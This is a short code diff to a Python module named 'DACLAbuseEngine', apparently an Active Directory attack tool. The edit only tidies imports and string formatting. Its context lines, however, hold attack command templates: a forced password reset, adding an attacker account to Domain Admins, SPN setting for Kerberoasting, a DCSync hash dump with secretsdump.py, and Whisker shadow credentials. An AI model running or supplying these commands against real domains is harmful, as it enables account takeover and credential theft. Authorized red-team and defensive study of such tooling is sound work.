@@ -12,7 +12,7 @@ from __future__ import annotations
 
 import re
 from dataclasses import dataclass, field
-from typing import Any, Optional
+from typing import Any
 
 ACE_TYPES = {
     "ACCESS_ALLOWED_ACE_TYPE": 0x0,
@@ -245,7 +245,7 @@ class DACLAbuseEngine:
                 ],
                 "GenericAll": [
                     f"Set-DomainUserPassword -Identity '{sam}' -AccountPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)",
-                    f"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'ATTACKER_USER'",
+                    "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'ATTACKER_USER'",
                 ],
                 "GenericWrite": [
                     f"Set-DomainObject -Identity '{sam}' -Set @{{serviceprincipalname='nonexistent/BOGUS'}}",
@@ -265,7 +265,7 @@ class DACLAbuseEngine:
                 ],
                 "DCSync": [
                     f"secretsdump.py {self.domain}/ATTACKER_USER@DC_IP",
-                    f"DCSync all hashes from domain controller",
+                    "DCSync all hashes from domain controller",
                 ],
                 "AddKeyCredentialLink": [
                     f"Whisker.exe add /target:{sam} /domain:{self.domain}",
